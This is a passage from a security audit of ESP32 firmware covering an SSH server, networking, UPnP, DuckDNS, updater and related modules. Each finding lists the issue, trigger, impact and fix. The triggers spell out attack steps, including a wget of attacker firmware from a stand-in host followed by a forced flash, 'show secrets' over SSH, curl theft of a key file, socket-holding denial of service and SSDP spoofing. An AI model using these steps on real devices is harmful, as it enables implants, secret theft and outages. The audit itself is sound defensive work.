`get_u32`. With `n = 0xFFFFFFFF` and a small `v.pos`, `v.pos + n` wraps modulo
2^32 to a tiny value that is `<= v.n`, so the guard passes. `get_string` then
returns `*outLen = 0xFFFFFFFF` with `*out` pointing inside the small packet
buffer, and advances `v.pos` by the wrapped amount. Nothing else bounds the
length.
**Trigger:** Finish the banner + KEXINIT + KEX_ECDH_INIT/REPLY + NEWKEYS (all of
which the server drives without authenticating the peer), then send
`SSH_MSG_USERAUTH_REQUEST` whose first `string` (user name) has length prefix
`0xFFFFFFFF`. `handle_userauth_request` calls `s.user.assign(userStr, 0xFFFFFFFF)`
(≈4 GiB) → allocation failure → `abort()` (IDF builds are `-fno-exceptions`) =
reliable remote crash. On the publickey sub-path the bogus length instead flows
into `put_string(toSign, pkBlob, pkBlobLen)` / inner `get_string`s, giving an
out-of-bounds read over adjacent heap (no MMU on ESP32) before the copy faults.
**Impact:** Unauthenticated remote denial of service (device reboot), and a
plausible out-of-bounds heap read. Every SSH message parsed after KEX inherits
the same flaw (channel data lengths, etc.).
**Fix:** Make `need()` overflow-safe: `if (v.bad || n > v.n || v.pos > v.n - n)`.
Do it in the shared header so both roles are covered.

### [High] Terrapin (CVE-2023-48795): strict-kex countermeasure absent, chacha20-poly1305 the only cipher
**Where:** `sshd_session.cpp:300-322` (`build_kexinit_payload`),
`ssh_client.cpp:358-374` (`put_kexinit`); dispatch in `sshd_session.cpp:634-638`
(`handle_newkeys`) and `ssh_client.cpp` NEWKEYS handling.
**Attacker:** (2) a MITM on the path.
**Issue:** Neither role advertises the `kex-strict-s-v00@openssh.com` /
`kex-strict-c-v00@openssh.com` marker, and neither resets the receive sequence
number at NEWKEYS nor rejects unexpected pre-KEX packets. The only negotiated
cipher is `chacha20-poly1305@openssh.com` — the exact mode Terrapin's
prefix-truncation attack targets. There is also no rekey. The server even
accepts `MSG_IGNORE`/`MSG_DEBUG` and `MSG_KEXINIT` freely during the handshake,
which is what strict-kex is meant to forbid.
**Trigger:** A MITM inserts an ignored packet during the unencrypted handshake
and later truncates an equal number of messages from the start of the encrypted
stream; sequence numbers stay aligned because they are never reset, so the MAC
still validates.
**Impact:** A network attacker can delete/rewrite the first
post-handshake message(s) — e.g. strip a client's extension-negotiation or the
server's auth-method signalling — undetected. Downgrade / message-injection
against confidentiality and integrity of the session start.
**Fix:** Implement strict kex on both roles: advertise the marker, and if the
peer also did, refuse any non-KEX packet before NEWKEYS and reset the inbound
sequence counter to 0 at NEWKEYS (drop the connection on any violation).

### [High] Unauthenticated session-slot exhaustion (no pre-auth timeout, only 2 slots)
**Where:** `sshd.cpp:40` (`SSHD_MAX_SESSIONS 2`), `sshd.cpp:135-144`
(`onTcpConnect` rejects when both slots busy), `sshd_session.cpp` (no auth/idle
timer anywhere in the session state machine).
**Attacker:** (1) unauthenticated, on the LAN — or the internet if the port is
UPnP-forwarded (see Info note).
**Issue:** A connection occupies one of only two `Session` slots from TCP accept
onward. There is no login-grace timeout and no cap on time spent in
VERSION/KEX/AUTH. net sets TCP keepalive with `TCP_KEEPIDLE = 10s` on accepted
sockets, so only a *silent* peer is reaped (~10s); an attacker that trickles a
byte, or sends periodic `SSH_MSG_IGNORE` in AUTH, holds the slot indefinitely.
**Trigger:** Open two TCP connections to port 22, complete the banner, and sit in
the AUTH phase sending an occasional `MSG_IGNORE`.
**Impact:** Both session slots pinned → the server admits no legitimate SSH
logins (including the build-host `spangap cli` bridge that prefers SSH). Trivial,
unauthenticated, persistent DoS from two sockets.
**Fix:** Add a per-session deadline (e.g. 30-60s) from accept to
USERAUTH_SUCCESS, and cap unauthenticated lifetime; close on expiry. Consider a
per-source-IP connection cap.

### [High] An authenticated SSH user gets the fully-privileged CLI — `show secrets` dumps the host seed, the client private key and all admin hashes
**Where:** `sshd_session.cpp:910-947` (`open_backend_with_mode` sets
`cli_connect_t{..., /*login*/0}`), consumed at spangap-core `cli.cpp:1265`
(`cl.loginRequired = cc->login != 0`) → `cli.cpp:1274` (`cl.authed = !loginRequired`);
`storage.cpp:2988` (`storageList`) and `storage.cpp:3054` (`cmdShow`) walk
`cfgRoot` — including the `secrets` subtree — with no redaction.
**Attacker:** (3) any authenticated SSH user. There is no less-privileged role:
`shell` and `exec` both open the `cli` backend with `login=0`, i.e. the admin
login gate is skipped (the SSH layer is treated as already-authenticated), and
publickey auth authorizes *any* username as long as the key is in
`s.sshd.authorized_keys`.
**Issue:** The bare `show` and `show secrets` CLI commands emit the entire
`secrets.*` tree in plaintext — `secrets.sshd.host_seed` (the Ed25519 host
private key seed), `secrets.ssh.privkey` (this device's outbound user key seed),
`secrets.auth.realms.*.hash` (admin password hashes), `secrets.wg.*`, etc. `set`
can also rewrite them. `secrets.*` is otherwise firewalled from the browser and
never synced — SSH is the one path that bypasses that boundary.
**Trigger:** `ssh device 'show secrets'` (one-shot) or type `show secrets` in the
interactive shell.
**Impact:** One authorized key = full secret exfiltration. With
`secrets.sshd.host_seed` an attacker can impersonate the device to every client
that trusted it (TOFU is defeated); with `secrets.ssh.privkey` they can log in
wherever this device's key is authorized; the admin hashes enable offline
cracking. This is a privilege-concentration issue: SSH access is effectively
unconditional root with no scoped/read-only mode.
**Fix:** Decide the intended privilege of an SSH session. If SSH is meant to be
admin-equivalent, at minimum keep `secrets.*` out of `show`/`storageList` output
on the SSH/CLI surface (as it already is for the browser). For a genuine
lower-privilege path, gate secret-touching commands behind a capability tied to
the authorized key.

### [Medium] Password auth shares one global rate-limit counter with the web/serial admin login
**Where:** `sshd_session.cpp:795-808` (password path → `authLogin(pw,"admin",…)`);
spangap-core `auth.cpp:175-182` (`isRateLimited`), `:415-444` (`authLogin` uses a
single process-global `failCount`/`lastFailMs`, reset only on success).
**Attacker:** (1) unauthenticated over SSH (password method), interfering with
the legitimate admin.
**Issue:** Every failed SSH password attempt increments the same global
`failCount` that gates the browser and serial admin logins, with exponential
backoff up to 5 minutes and no reset except on a correct password. Publickey
offers/attempts, by contrast, are *not* counted or throttled at all — a client
may send unlimited publickey probes.
**Trigger:** Send a stream of wrong `password` USERAUTH_REQUESTs (across
reconnects to dodge the slot limit).
**Impact:** (a) An attacker locks the real admin out of the web UI and serial CLI
for up to 5 minutes at a time indefinitely (availability). (b) Publickey auth has
no attempt limiting — only the credential strength itself protects it.
**Fix:** Track auth failures per-connection (and enforce a small max attempts →
disconnect) inside the SSH session, rather than leaning on the shared global
limiter; consider isolating the SSH failure counter from the web/serial one.

### [Low] X25519 shared secret not checked for low-order / all-zero result
**Where:** `sshd_crypto.cpp:85-152` (`x25519_compute`), server
`sshd_session.cpp:399-408`/`415-450`, client `ssh_client.cpp:543`.
**Attacker:** a peer supplying a crafted Q (mostly relevant to a MITM/malicious
server against the client, or a client probing the server).
**Issue:** RFC 7748 §6.1 recommends rejecting an all-zero X25519 output (the
peer sent a low-order point). mbedTLS `ecp_check_pubkey_mx` only bounds the X
size/sign and does not reject the low-order points, and neither role checks the
resulting `sharedK` for all-zero. The `u_le[31] &= 0x7F` mask is correctly
applied.
**Trigger:** Peer sends a low-order Curve25519 point as Q.
**Impact:** Low. The exchange hash `H` is signed by the host key and verified by
the client, so a MITM cannot drive a chosen K without the host key; on the server
side a client that forces a known K still cannot authenticate. Contributes no
concrete break by itself, but the defensive check is missing.
**Fix:** After `x25519_scalar`, reject if `sharedK` is all zero.

### [Low] Host/user key seeds may be generated before the RF entropy source is fully active
**Status: fixed 2026-09-10** together with the rns entropy finding: all sshd randomness now comes from spangap-core's boot-seeded DRBG.
**Where:** `sshd.cpp:84-94` (`generateHostSeed`, called from `onInit:596-598`),
`sshd.cpp:481-496` (`sshd-keygen`), `ssh_client.cpp:1242` (`ssh-keygen`); all use
`esp_fill_random`.
**Attacker:** anyone, if a weak seed is produced.
**Issue:** `esp_fill_random` is only a CSPRNG once the RF subsystem (Wi-Fi/BT) or
a bootloader entropy source is active. First-boot host-seed generation runs in
`onInit`; the exact ordering versus RF bring-up could not be confirmed statically.
If it runs before RF is up, the seed may have reduced entropy.
**Trigger:** First boot generating the persistent host seed.
**Impact:** Potentially predictable long-lived host/user keys. Low pending
confirmation of boot ordering (the straddle requires net, which starts Wi-Fi, so
it is likely fine — flagged for verification).
**Fix:** Confirm `bootloader_random_enable`/RF is active before the first
`esp_fill_random` for key material, or defer seed generation until after net is
up.

### [Info] Username is not enforced; documented and consistent
`handle_userauth_request` records but does not check the user name, and binds it
into the signed blob consistently, so publickey/password verification is sound.
Standard SSH behaviour; noted because it widens the blast radius of the
privilege finding above (any name + one authorized key = admin).

### [Info] SSH port is auto-exposed to the internet when a UPnP straddle is present
`sshd.cpp:101-115` registers the listener with `net` and net marks listeners
public-facing; `upnp.cpp:388-396` forwards *every* public-facing listener via
`netPublicPorts`. On a build that includes `upnp`, port 22 can be opened at the
gateway automatically, turning the LAN-only attacker model (1) into an
internet-exposed one for all findings above. Confirm sshd's registration
(`publicFacing`) intent; the registration here sets `defaultPort=0` and does not
set `publicFacing`, so verify net does not treat it as public by default.

## Positive notes

- **AEAD verified before use.** `cc20p1305_open` (`sshd_crypto.cpp:247-263`)
  recomputes and checks the Poly1305 tag with a constant-time compare
  (`ct_memcmp16`, `:52-57`) *before* decrypting; `parse_packet` in both roles
  returns -1 (kills the session) on tag failure. No plaintext is acted on before
  MAC validation.
- **PK_OK cannot bypass verification.** The publickey path only ever returns
  SUCCESS after `ed25519_verify` over the full session-id-bound blob
  (`sshd_session.cpp:763-785`); the no-signature probe just returns PK_OK. An
  unauthorized key gets FAILURE in both the probe and the signed step, and an
  empty `authorized_keys` list rejects everyone (`authorized_pub_matches`
  returns false).
- **"none" auth is rejected** — it falls through to `send_userauth_failure`
  (`sshd_session.cpp:810-811`).
- **Exchange-hash / K encoding is correct** for both the classical
  (`mpint(K)`) and PQ hybrid (`string(K)`, `K = SHA256(mlkem_ss||x25519_ss)`)
  paths, with V_C/V_S and I_C/I_S ordered per role (`compute_exchange_hash`,
  `hash_update_K`), and the host key hashed as the full `K_S` blob. The client
  verifies the host signature over `H` before trusting anything and keeps TOFU
  `known_hosts` that refuses a *changed* key.
- **Port forwarding / SFTP / X11 / agent-forwarding / second channel / signals**
  are all refused; only one `session` channel routed to the fixed cli/log
  backends (`handle_channel_open`, `handle_channel_request`). `exec` command
  length is bounded (`cmdLen > 256` rejected) with a correctly sized local buffer.
- **Vendored crypto looks current and safely wired.** orlp Ed25519 `verify.c`
  applies the `signature[63] & 224` non-canonical-S check and rejects a bad `R`;
  the known-problematic `ed25519_key_exchange` and `ed25519_add_scalar` APIs are
  *not* referenced anywhere in the glue (only `create_keypair`/`sign`/`verify`).
  mlkem-native is pinned to v1.1.0, portable-C backend only, encapsulation-only,
  RNG wired to `esp_fill_random`; `mlkem768_encap` correctly propagates the pk
  modulus-check failure.

---

# spangap-net, acme, duckdns, upnp, updater, wg, spangap-rtc

## Coverage

Read in full: every README/INTERNALS/docs file of the seven straddles; `spangap-net/esp-idf/src/{net,tls,wget,ntp,spangap_mdns}.cpp` and `include/*.h`; `acme/esp-idf/src/acme.cpp`; `duckdns/esp-idf/src/duckdns.cpp`; `upnp/esp-idf/src/upnp.cpp`; `updater/esp-idf/src/updater.cpp`; `wg/esp-idf/src/wg.cpp` plus the glue `esp_wireguard/{esp_wireguard.c,wireguard-platform.c}`; `spangap-rtc/esp-idf/rtc_service.cpp` (rtc.cpp skimmed, pure I2C BCD driver); all seven `straddle.yaml` settings blocks. Cross-checked in spangap-core: `cli.cpp` (`cliResolveFsPath`, `cliTcpConnect`), `log.cpp` (`logTcpConnect`), `storage.cpp`/`storage.h`/`docs/storage.md` (`secrets.*` filtering), `auth.cpp`/`docs/auth.md`, `fs.cpp` (`fsStateDir`), `sdkconfig.defaults.spangap`; spangap-web `webrtc_task.cpp` DataChannel router and `docs/web.md` (`/state` WebDAV mapping); iface-tcp / iface-lora / sshd port registrations for `publicFacing`; IDF `lwip/api/err.c` and `esp_http_client.c`.

Not done: the vendored `wireguard.c` / `wireguardif.c` / crypto were not audited line-by-line (upstream trombik/esp_wireguard v0.9.0 + the PR #45 crash fixes and the netif->state sidecar map per INTERNALS.md; I checked only the glue and the peer/allowed-IP setup). `net_tinylcd.cpp` skimmed only (display of hostname/IP). I did not build anything, so effective sdkconfig values beyond `sdkconfig.defaults.spangap` are inferred. The spangap-web side of the WebRTC DataChannel authentication is out of scope here; I only assessed what the `net:2` dial permits once reached.

## Findings

### [High] Remote peer can hang the net task forever by opening a TLS port and staying silent

**Where:** `spangap-net/esp-idf/src/tls.cpp:400-415` (BIO recv callback), `tls.cpp:417-436` (handshake loop), `net.cpp:455-481` (accept path, on the net task).
**Attacker:** Unauthenticated, anyone who can reach an `s.net.https_port` / other `tls=1` listener: the LAN, the device's own open AP, or the internet once upnp forwards 443 (it does whenever `s.upnp.enable=1`).
**Issue:** `tlsAccept()` runs the handshake synchronously on the net task with the socket set blocking and `SO_RCVTIMEO`/`SO_SNDTIMEO` = 3 s. The intent (INTERNALS §4) is that a stale client can only park the task for 3 s. But lwIP maps a receive timeout to `EWOULDBLOCK` (`err_to_errno_table`: `ERR_TIMEOUT → EWOULDBLOCK`), the BIO callback turns `EAGAIN/EWOULDBLOCK` into `MBEDTLS_ERR_SSL_WANT_READ`, and the loop `while ((ret = mbedtls_ssl_handshake()) != 0) { if (ret != WANT_READ && ret != WANT_WRITE) {…fail…} }` simply retries on `WANT_READ`. Every 3-second timeout therefore loops straight back into `recv()`. Keepalive is only set *after* `tlsAccept` returns, so nothing else terminates the connection.
**Trigger:** `nc <device> 443` and press nothing (or send a partial ClientHello, or a raw TCP SYN-ACK'ed connection from any tool that keeps the socket open). The device's net task is now blocked inside `mbedtls_ssl_handshake` until the attacker closes the socket.
**Impact:** The net task is the WiFi state machine, the whole TCP relay (HTTPS/HTTP web, RTSP, RNS TCP interfaces, sshd's listener, the CLI/log TCP ports, outbound dials) and the `NET_EV_POLL` bus driving ntp, wg and upnp. All of it stops. Existing relayed connections stall (their bytes are pumped by the same loop), new connections are never accepted, WiFi reconnects never happen. One TCP socket = full network denial of service, from the internet if 443 is forwarded. `handshakeInProgress` also makes `tlsReady()` false so the RST-refuse path never gets a chance either.
**Fix:** Treat a timed-out handshake as fatal: in the BIO callbacks distinguish a real non-blocking `EAGAIN` from the `SO_RCVTIMEO` expiry (e.g. keep the fd non-blocking and drive the handshake from the `select()` loop with a per-connection deadline, closing the fd when it expires), or at minimum bound the handshake loop by wall clock (`millis() - start > 3000 → close`). Longer term move the handshake off the net task entirely (a small pool or the owning task) so one slow peer cannot stall unrelated relays.

### [High] Plain-TCP CLI port is unauthenticated and can be enabled by any config writer

**Where:** `spangap-net/esp-idf/src/net.cpp:270-277` (`netRegisterCorePorts`, `cli_port`/`log_port`), `net.cpp:371-393` (`netAcceptOne` sends a `net_connect_t`), `spangap-core/esp-idf/src/cli.cpp:1259-1274` (`cliTcpConnect`: a payload larger than `cli_connect_t` → `loginRequired=false`, `authed=true`).
**Attacker:** (1) Unauthenticated on the LAN / the device's AP once the port is open; (3) an authenticated web/CLI user to open it.
**Issue:** `s.net.cli_port` and `s.net.log_port` default to 0 (closed), but they are ordinary `s.*` keys — any authenticated browser session, the LCD, a boot script, or a `set` on any CLI can set them (`epOpenAll()` rebinds on the change subscription without a reboot). Net hands the accepted socket to the CLI task with `net_connect_t`, which `cliTcpConnect` classifies as "larger connect descriptor from a forwarder" and marks the session authenticated. There is no password gate on that path (sshd and the DataChannel CLI do get one via `cli_connect_t.login`).
**Trigger:** Authenticated user (or a `/state/net_up` script, see below) runs `set s.net.cli_port=8081`. Then anyone on the LAN: `nc <device> 8081` → root shell equivalent (`set`, `show secrets.*`, `wget`, `updater -f`, `cert delete` …). Also reachable from the device's own AP (open by default, see below).
**Impact:** Full unauthenticated device control on the LAN for the lifetime of the setting (persisted). The log port equally streams every log line (including the `scan found` SSID list, inbound TLS peer IPs, hostnames) to anyone. upnp never forwards these ports (`publicFacing=false` at registration, and nothing re-registers them), so exposure is LAN-scale, not internet — but a `wget -O /state/net_up` or a browser write is enough to persist it. Note that `netDialSync` can reach `127.0.0.1` (lwIP loopback is on by default), so the WebRTC `net:2` dial can also land on an open `cli_port` from a browser.
**Fix:** Have net pass a `cli_connect_t{ .mode=CLI_LINE, .login=1 }`-equivalent for `cli_port` connections (or have `cliTcpConnect` default `loginRequired=true` for any forwarder payload) so the TCP CLI sits behind the admin password like sshd does; consider marking `s.net.cli_port` / `s.net.log_port` as CLI-only / not browser-writable, and log a warning line on every boot while either is non-zero.

### [High] Staged-image update path: any config/file writer gets persistent code execution; no signature, no rollback, no downgrade check

**Where:** `updater/esp-idf/src/updater.cpp:102-152` (`updaterTrigger`), `updater.cpp:181-188` (storage trigger on `updater.cmd.update` / `updater.cmd.update_force`), README "No signature verification".
**Attacker:** (3) Authenticated web/CLI user; also (1) via the unauthenticated CLI port above, or anyone who can write the state store (WebDAV `/state` is mapped `dav=1` for the admin realm per spangap-web docs; sshd scp; `wget -O`).
**Issue:** The trust boundary is documented as "the staging step, not in this straddle", but no in-tree staging path performs any verification: `wget` writes whatever an HTTP(S) server returns, WebDAV/scp write bytes verbatim, and the flasher slot "trusts the staged file unconditionally". `seccam/keys/ota_pub.pem` / `tools/gen_ota_pubkey_h.py` belong to the superseded A/B `ota` design (`docs/ota.old.md`); nothing in `updater` or in any current buildable references an OTA public key. The non-forced guard only compares the staged partition table's `max(offset+size)` against `state->address` (and `e.offset + e.size` is a `uint32_t` sum that can wrap); `-f` skips even that. `esp_ota_set_boot_partition` + `esp_restart` with no image header check, no version comparison, no anti-rollback, and no secure boot / flash encryption configured in `sdkconfig.defaults.spangap`.
**Trigger:** `wget -O /state/flashme.bin http://attacker/evil.bin` then `updater -f` (or PUT via WebDAV and write `updater.cmd.update_force=1` from the browser storage sync). Device reboots into the flasher and flashes attacker firmware.
**Impact:** A single authenticated session (or LAN access to an open cli_port) becomes a permanent firmware implant that survives factory reset of the state store; no way to detect a downgraded/modified image. A MITM on a plain `http://` wget (allowed by `cmdWget`) does the same against an operator who fetches an update by hand.
**Fix:** Verify a detached signature (ed25519/ECDSA over the image) before `esp_ota_set_boot_partition`, or at least in the flasher slot; embed and compare a monotonically increasing version in the image header; enable IDF secure boot v2 + flash encryption on production builds so the bootloader refuses unsigned app slots regardless of how the file arrived.

### [High] Open, password-less fallback AP exposes an unauthenticated device for ≥10 minutes after every boot

**Where:** `net.cpp:700-734` (`startAP`, `WIFI_AUTH_OPEN` when `s.net.wifi.ap.pass` is empty), `net.cpp:2937` in the defaults (`"ap": { "pass": "" }`), `net.cpp:491-500` (idle timer restarted by any TCP traffic via `netActivity()`), `net.cpp:2978` (`authRealmUnset("admin")` → "No device password set").
**Attacker:** (1) Anyone within radio range.
**Issue:** Defaults: AP enabled, open (no WPA2), SSID `<hostname>_<mac>`, IP 192.168.1.1, lives 10 minutes after boot, and on a device with no known network in range it comes up on every boot. The admin password ships unset and is only *logged*. Every relayed TCP service listens on `INADDR_ANY` (`epOpenPort`), so the AP client reaches HTTP/HTTPS, RTSP, the RNS TCP ports, sshd, and the cli/log ports if set. Any TCP byte resets `lastActivityMs`, so a client that keeps one connection open (e.g. the TLS-hang above, or an idle WebSocket) keeps the AP alive indefinitely. `s.net.wifi.ap.pass` is a plain `text:` row, not `secret:`, so it is also displayed in clear on both UIs.
**Trigger:** Join `<hostname>_xxxx`, browse to `https://192.168.1.1`. On a device whose admin password was never set, that is full control; on one with a password, it is still the full unauthenticated attack surface (the TLS DoS, HTTP/HTTPS pre-auth handlers, RNS TCP interfaces with empty IFAC key) at zero distance.
**Impact:** Drive-by takeover of unprovisioned devices; persistent unauthenticated access to provisioned ones for as long as the attacker keeps a socket open.
**Fix:** Generate a per-device random WPA2 passphrase at first boot (print it on the LCD / serial / QR, like the SSID suffix is derived), or at least refuse to start an open AP once an admin password exists; do not let arbitrary inbound TCP traffic extend the AP window (count only authenticated sessions); mark the AP password row `secret: true`.

### [Medium] Rogue SSDP responder on the LAN redirects UPnP, poisons the DuckDNS A record, and can inject parameters into the DuckDNS request

**Where:** `upnp/esp-idf/src/upnp.cpp:441-512` (first M-SEARCH reply wins, `LOCATION` fetched over plain HTTP from any host), `upnp.cpp:523-530` (`getExternalIp` — `extIp` is the unvalidated `<NewExternalIPAddress>` text), `duckdns/esp-idf/src/duckdns.cpp:113-125` (`ip=%s` spliced into the URL unencoded, together with the operator's token).
**Attacker:** (1) Unauthenticated on the LAN (any host, or a client of the device's AP when in APSTA).
**Issue:** INTERNALS §6 acknowledges "upnp trusts whatever answers the multicast". The consequences compound: (a) all `AddPortMapping`/`DeletePortMapping` go to the attacker → mappings silently never happen (DoS of remote access); (b) the attacker returns any string as the external IP; duckdns sends it verbatim as `ip=` to `https://www.duckdns.org/update?domains=<sub>&token=<token>&ip=<attacker-string>&verbose=true`. The string is neither validated as an IPv4 literal nor URL-encoded, so `1.2.3.4&txt=foo` or `&clear=true` appends arbitrary DuckDNS parameters authenticated by the operator's token (`url[256]` only truncates). (c) Pointing the A record at an attacker IP lets the attacker pass a Let's Encrypt HTTP-01 for the device's FQDN and obtain a browser-trusted cert for it, then impersonate the device to the operator.
**Trigger:** On the LAN, answer M-SEARCH with `LOCATION: http://<attacker>/d.xml`; serve an XML containing `WANIPConnection` and a `<controlURL>`; answer `GetExternalIPAddress` with `<NewExternalIPAddress>203.0.113.9</NewExternalIPAddress>` (or an injection string). Wait ≤15 min for the duckdns cron.
**Impact:** Remote-access denial, DNS hijack of the device's public name, and a path to a valid TLS cert for that name. Requires `s.upnp.enable=1` and DuckDNS configured — the documented remote-access setup.
**Fix:** Validate `extIp` with `ipaddr_aton` (reject anything else and never pass a non-routable/private address to DuckDNS); URL-encode every query parameter in duckdns; only accept SSDP replies whose source address is the default gateway (or whose `LOCATION` host is the gateway); prefer DuckDNS auto-detect over a LAN-supplied IP.

### [Medium] Outbound dial-on-behalf (`net:2`) is an unrestricted TCP proxy that also blocks the net task

**Where:** `net.cpp:590-684` (`netDialSync`, `netOnDialConnect`); reached from any ITS client, including the WebRTC DataChannel router in `spangap-web/esp-idf/src/webrtc_task.cpp:706-755`, which connects a browser channel labelled `"<task>:<port>"` to any task/port.
**Attacker:** (3) Authenticated web user (or whoever the web reviewer finds can open a DataChannel).
**Issue:** The payload `"host:port"` is used as-is: any hostname/IP (LAN hosts, the router admin interface, `127.0.0.1`, IPv6 link-local), any port. The handle becomes a raw byte stream both ways, so the browser gets a generic SOCKS-like pivot onto the device's LAN and to the device's own non-TLS listeners (an open `cli_port` — pre-authenticated, see above — or the RNS TCP ports). Additionally `netDialSync` runs synchronously on the net task: `getaddrinfo` (blocking DNS) plus up to 8 s per address candidate; a name with several A/AAAA records that black-hole SYNs stalls the whole relay for tens of seconds per dial, repeatable.
**Trigger:** From a DataChannel: label `net:2`, first message `192.168.1.1:80` → browse the router; `127.0.0.1:8081` → device CLI without a password if `cli_port` is set; `blackhole.example:1` repeatedly → net task stalls.
**Impact:** LAN pivot / SSRF from the browser session, loopback bypass of any future auth on plain listeners, and an easy relay-wide DoS from an authenticated client.
**Fix:** Restrict the dial port to in-firmware ITS peers (refuse `net:2` from the DataChannel router, or require an allow-list of `host:port` targets kept in `s.tcp.*`); reject loopback and link-local destinations; move DNS + connect off the net task (a small dial worker) or make it non-blocking within the existing `select()` loop.

### [Medium] Eight shared relay slots can be exhausted by an unauthenticated peer

**Where:** `net.cpp:166` (`NET_MAX_CLIENTS 8`), `net.cpp:374-376` (accept fails when full), `net.cpp:472-477 / 488-493` (keepalive only if the registrant asked).
**Attacker:** (1) Unauthenticated LAN/AP peer, or internet if 443 is forwarded.
**Issue:** All relayed services — HTTPS, HTTP, RTSP, RNS TCP, sshd, cli/log — share one 8-entry client table. A peer that opens 8 connections to any listener (e.g. HTTPS, with a completed handshake and then silence) occupies every slot; every later accept on every endpoint is closed immediately. Nothing times out an idle relayed connection unless the owning task closes it or the registrant set `keepAlive` (spangap-web's HTTPS registration is out of my scope; iface-tcp sets it, but keepalive fires only after 10+15 s and only against a dead peer, not a live idle one).
**Trigger:** 8 × `openssl s_client -connect device:443` left open.
**Impact:** Denial of service of every TCP service at once, including sshd and the RNS TCP interfaces, from a single unprivileged host.
**Fix:** Per-endpoint slot quotas (reserve at least one slot for sshd/cli), an idle timeout for relayed clients with no traffic, and a larger table for the endpoints that need it.

### [Medium] `wget` follows redirects across scheme, accepts plain `http://`, and has no size limit

**Where:** `spangap-net/esp-idf/src/wget.cpp:65-72` (`max_redirection_count = 10`, no `disable_auto_redirect`), `wget.cpp:117-119` (`http://` accepted), `wget.cpp:47-56` (no byte cap).
**Attacker:** (2) MITM on the path (coffee-shop WiFi, malicious upstream) against an operator running `wget`.
**Issue:** TLS validation is correct for the first hop (`esp_crt_bundle_attach`, hostname checked by esp-tls), but `esp_http_client` follows a `Location:` to any scheme via `esp_http_client_set_url` (`esp_http_client.c:1062-1073`); an `https://` fetch that is redirected to `http://` is silently downgraded and the plaintext body is what gets saved. Plain `http://` URLs are accepted outright. The saved file may be anything, including `/state/flashme.bin` or `/state/net_up` (see next finding); the body is streamed to disk with no limit, so a hostile server can also fill the state partition (which is where config, certs and keys live).
**Trigger:** Operator: `wget https://example.org/fw.bin`; MITM answers `302 Location: http://example.org/fw.bin` and serves a trojan; or operator uses `http://` at all.
**Impact:** Attacker-controlled file on the device with operator intent; combined with the updater path this is firmware replacement; with `net_up` it is command execution at next upstream-up.
**Fix:** Set `disable_auto_redirect = true` and handle redirects manually, refusing `https→http`; refuse `http://` unless an explicit `--insecure` flag is given; cap the download at a configurable size and check free space; consider requiring a checksum argument for anything written under `fsStateDir()`.

### [Medium] `/state/net_up` boot hook turns any state-store write into command execution

**Where:** `net.cpp:279-291` (`netUpScriptTask` → `cliRunFile(fsStatePath("/net_up"))` on every `NET_EV_UPSTREAM_UP`), `fs.cpp:134-140` (`fsStateDir()` is `/sdcard/state` when an SD card is the active store).
**Attacker:** (3) Authenticated web user (WebDAV `/state`, `wget -O`), sshd/scp user, or anyone with physical access to the SD slot.
**Issue:** Every upstream-up runs an unsigned script from the writable state store with full CLI privileges. Web/DAV write access is treated as "config editing" (docs: "Live config and certs for inspection / hand-edit") but is in fact code execution, and the script survives reboots. With the SD card as the active store, a prepared card containing `state/net_up` (e.g. `updater -f` alongside `state/flashme.bin`, or `set s.net.cli_port=8081`) executes on the next boot with a network.
**Trigger:** `PUT /state/net_up` with body `set s.net.cli_port=8081` (or insert an SD card with that file).
**Impact:** Privilege persistence for anyone with file-write access; an SD card becomes an unauthenticated physical implant.
**Fix:** Keep the hook but gate it (a `s.net.net_up.enable` off by default, or only run it from the flash `/state`, never from `/sdcard/state`), log its contents at info when it runs, and exclude `net_up`, `flashme.bin`, `*_key.pem` from WebDAV writes.

### [Medium] Cert private keys are plain files on `/state`, exported and importable through the admin file surfaces

**Where:** `tls.cpp:48-70` (`tls_key.pem` / `tls_cert.pem` written with `fs_open(…, "w")`), `acme.cpp:55-62, 517-523, 544-549` (`acme_key.pem`, `tls_key.pem`), spangap-web `docs/web.md:66` (`/state` mapped for admin with WebDAV read+write), `spangap-web/esp-idf/src/safe_mode.cpp:637` (backup tarball of the whole state dir).
**Attacker:** (3) Authenticated web user; (1) anyone holding a backup archive or an SD card.
**Issue:** The TLS server key, the Let's Encrypt account key and the DuckDNS token are all readable by any admin session (GET `/state/tls_key.pem`, the backup `.tgz`, `show s.duckdns.token`). They are also *writable*: an admin can replace `tls_key.pem`/`tls_cert.pem` and `tlsReloadCert()` (or a reboot) installs them; `acme_key.pem` replacement hijacks the LE account. No flash encryption is configured, so the keys are also plaintext on the flash chip / SD card. `secrets.*` (WireGuard private key, auth hashes) is correctly filtered from browser sync (`storage.cpp:433, 3265`) but that protection does not extend to the PEM files, and the `/state` DAV mapping sits beside them. Consistent with the documented model (admin = owner), but the ACME account key and the DuckDNS token are long-lived off-device credentials worth more than one session.
**Trigger:** Log in once; `curl -b cookie https://device/state/acme_key.pem`.
**Impact:** Offline impersonation of the device's HTTPS name until the cert expires (up to 90 days for LE; 10 years for the self-signed cert), account takeover at Let's Encrypt / DuckDNS.
**Fix:** Move key material out of the DAV-visible tree (a `/state/private/` excluded from the mapping and from backups by default, or NVS with flash encryption); never serve `*_key.pem` over HTTP; mark `s.duckdns.token` as a `secrets.*` key rather than a masked `s.*` one.

### [Low] TLS server: ECDHE-ECDSA-CHACHA20-POLY1305 only, TLS 1.2 only, session tickets on, no ALPN

**Where:** `tls.cpp:206-225` (`mbedtls_ssl_config_defaults(MBEDTLS_SSL_PRESET_DEFAULT)`, single ciphersuite, `MBEDTLS_SSL_VERIFY_NONE`), `spangap-core/esp-idf/sdkconfig.defaults.spangap:272-297` (`TLS1_3` not set, `SERVER_SSL_SESSION_TICKETS=y`, `HARDWARE_AES=n`).
**Attacker:** (2) MITM.
